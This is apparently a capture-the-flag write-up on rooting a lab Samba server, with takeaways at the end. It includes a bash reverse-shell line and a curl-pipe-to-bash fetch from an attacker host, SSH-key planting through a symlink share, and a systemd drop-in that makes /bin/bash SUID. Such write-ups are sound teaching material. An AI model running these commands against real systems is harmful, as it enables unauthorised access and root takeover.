## Overview
"Abducted" is a medium-difficulty Linux machine built on an incorrectly configured _Samba_ file/print server.
A "print-subsystem command" injection ([CVE-2026-4480](https://access.redhat.com/security/cve/cve-2026-4480)) lands the initial foothold:
This is followed by a reused `rclone` backup password, which enables lateral movement to Scott, which in turn abuses an incorrect SMB configuration to pivot to Marcus.
Finally, `polkit` delegates control over the _Samba_ service, which is abused through a `systemd` drop-in by Marcus' assigned group, which then escalates to root.

### Enumeration
After enumerating the SMB Service, we find out that we have write access using a "Null Session":
```bash
  nxc smb $IP -u "" -p "" --shares 
```

![](smb_list.png)

It is then possible to use `rpcclient` via the "Null Session" to retrieve more information over the SMB pipe:
```bash
rpcclient $> enumdomusers
enumdomusers user:[scott] rid:[0x3e8]

rpcclient $> enumprinters
	flags:[0x800000]
	name:[\\10.129.244.177\]
	description:[\\10.129.244.177\,,Reception printer]
	comment:[Reception printer]
```
This makes it clear that we have a printer service running over _Samba_.
(Based on the Share Name and an available printer that correlates to that Share).

We can rule out the following: A PrinterJob is taken, and expanded via `%J` into a shell command, therefore, we can inject a malicious payload as the PrinterJob name.

##  Foothold
1. set up a `shell.sh` file using:
```bash
echo 'sh -i >& /dev/tcp/$IP/$PORT 0>&1' > shell.sh
```
2. set up a payload-serving endpoint using a web server of your choice:
```bash
python3 -m http.server 8000
```
3. finally, listen on the interface's to-be-called port:
```bash
sudo nc -lvnp 80
```

We then point the exploit to our server and make it pipe it into bash for execution:
```bash
python3 CVE-2026-4480-PoC/exploit.py 10.129.244.177 10.10.16.223 80 -c "curl 10.10.16.223:8000/shell.sh | bash
```

**Which gives us a shell:**

![](shell.png)

From the previous output of the `rpcclient` commands, we know a user exists within the existing _Samba_ configuration; i.e., Scott.

We will check for unix-based accounts on the System, which reveals:
```bash
cat /etc/passwd
--- Snip ---
scott:x:1000:1001:Scott Mercer:/home/scott:/bin/bash
marcus:x:1001:1002:Marcus Vale:/home/marcus:/bin/bash
```
Two users, noted.

`wide links = yes` allows sym-links to reference files outside of the configured Share directory.
This combination can be abused to create (or modify) files outside `/srv/transfer` with Marcus' filesystem permissions. For example, if a sym-link in the writable Share points to the SMB configuration file (`shares.conf`), a user with write access to the Share could potentially modify that file as Marcus.
Additionally, `wide links = yes` allows sym-links to reference files outside the configured Share directory.

So, after analysis, issue is caused by:
- a writable SMB share,
- force `user = marcus`,
- ...and `wide links = yes`

which can result in unintended file access outside the intended share directory.

```bash
nobody@abducted:/etc/samba$ cat shares.conf
cat shares.conf
[HP-Reception]
   comment = Reception printer
   path = /var/spool/samba
   printable = yes
   guest ok = yes
   print command = /usr/local/bin/printaudit %J %s
   lpq command = /bin/true
   lprm command = /bin/true

[projects]
   comment = Hartley Group Project Files
   path = /srv/projects
   valid users = scott
   read only = no
   browseable = yes

[transfer]
   comment = Staff file transfer
   path = /srv/transfer
   valid users = scott
   force user = marcus
   read only = no
   wide links = yes
   browseable = yes
```
We need to have a valid user to be able to access the share where the symlink can be executed.

The technique and the reason behind why this file is configured wrongly is explained in the following:
- [**smb.conf malconfiguration**](https://hacktricks.wiki/en/network-services-pentesting/pentesting-smb/index.html#wide-links--force-user--write-outside-the-share-as-another-unix-user)

We need the Scott account first, though: under `/opt/`, we find an off-site backup, which contains the configuration of following `SFTP` script's configuration being used:

```bash
nobody@abducted:/opt$ cat rclone.conf
[offsite]
type = sftp
host = backup.hartley-group.internal
user = svc-backup
pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
shell_type = unix
```
Note that `rclone` encrypts the password, so it does not sit in plain text, if an accidental commit takes place. We can reveal (decrypt) the password using:
```bash
nobody@abducted:/etc/samba$ rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw

iXzvcib3SrpZ
```

Great, we got the password. We can try to now reuse this with the other available accounts, on both: the Unix sockets, and the external authentication endpoints, in which we finally get the user Scott:
```bash
-$ ssh scott@$ip
scott@10.129.244.177's password:

scott@abducted:~$ ls
user.txt
scott@abducted:~$ cat *
<REDACTED>
scott@abducted:~$ 
```

Now symlink the vulnerable users directory with the share using:
```bash 
mkdir -p  /srv/transfer/marcus
ln -s /home/marcus /srv/transfer/marcus
```

Having the user, we can now log into the share using `smbclient` to place a `ssh-key.pub` file into Marcus' `.ssh/authorized_keys` file:
```bash
ssh-keygen -t rsa -f id_rsa -N ''

smbclient //$IP/transfer -U scott%iXzvcib3SrpZ
smb: \> ls
smb: \> cd marcus
smb: \> cd marcus
smb: \marcus\>  mkdir .ssh
smb: \marcus\> put  ~/.ssh/id_rsa.pub .ssh/authorized_keys
```

Now SSH into Marcus using:
```bash
ssh -i id_rsa marcus@ip

marcus@abducted:~$ whoami
marcus
marcus@abducted:~$ id
uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators)
marcus@abducted:~$ 
```

##  Privilege Escalation
Marcus is part of the operators group. After careful enumeration and a lot of potential vulnerable paths, the one that stood out the most is that Marcus group, "operators", has a **custom `polkit` rule** that allows him to use `systemctl` and restart specific services.

We then check for writable files in the `/etc/systemd/` directory; files, that are either group owned, or writeable (or both).
...and find the following directory being writable:
```bash
marcus@abducted:/etc/systemd$ find /etc/systemd/ -type d -writable 2>/dev/null
/etc/systemd/system/smbd.service.d
marcus@abducted:/etc/systemd$ find /etc/systemd/ -type f -writable 2>/dev/null
marcus@abducted:/etc/systemd$ find /etc/systemd/  -writable 2>/dev/null
/etc/systemd/system/systemd-networkd-wait-online.service
/etc/systemd/system/systemd-networkd.service
/etc/systemd/system/smbd.service.d
/etc/systemd/system/samba-ad-dc.service
/etc/systemd/system-generators/systemd-gpt-auto-generator
marcus@abducted:/etc/systemd$ find /etc/systemd/  -writable -group operators 2>/dev/null
/etc/systemd/system/smbd.service.d
marcus@abducted:/etc/systemd$ ls -la /etc/systemd/system/smbd.service.d/
total 8
drwxrws---  2 root operators 4096 Jun  4 13:41 .
drwxr-xr-x 26 root root      4096 Jun  4 13:41 ..
```

**So, basically:**
```bash
/etc/systemd/system/smbd.service.d/
```

We call this a **drop-in directory**.
The `smbd.service.d` drop-in directory is group-owned by operators, so Marcus can write a drop-in file into it.
A separate custom `polkit` rule authorises operators to `systemctl restart smbd`.  We drop an `override.conf` adding a root-run `ExecStartPre=...` hook, then `daemon-reload`, and restart `smbd` which results in our RCE

![](smbd.png)

```bash
vi /etc/systemd/system/smbd.service.d/override.conf

  [Service]
  ExecStartPre=/bin/bash -c 'chmod +s /bin/bash'

systemctl daemon-reload
systemctl restart smbd
```

Resulting in obtaining root:
```bash
marcus@abducted:/etc/systemd$ /bin/bash -p
bash-5.2# whoami
root
```

![](rooted.png)

### Takeaways:

We take away a few things from "Abducted. The foothold comes from Samba throwing a not sanitised print job name into a shell, so the filename itself becomes vulnerable. 
(reminder that any % substitution in a service configuration is an injection risk and filenames are vulnerable inputs)

We also learn the way `shares.conf` can be configured incorrectly, allowing us to write into places where we shouldn't have been able to.
`wide links` and `force user` allow us step outside of the directory and drop a file into another user's home with permissions set for that user, which is all it needs to place our own SSH key into the `.ssh/authorized_keys` file.

Finally, `systemd` drop-in directories and how to abuse them. We learn that a unit is never just its `.service` file, `systemd` also merges every `*.conf` from the matching `*.d/` directory on top of it, so write access to that directory is like owning the unit. Once we can drop an `override.conf` with a root-run `ExecStartPre`, we essentially gain RCE within the units context (root)
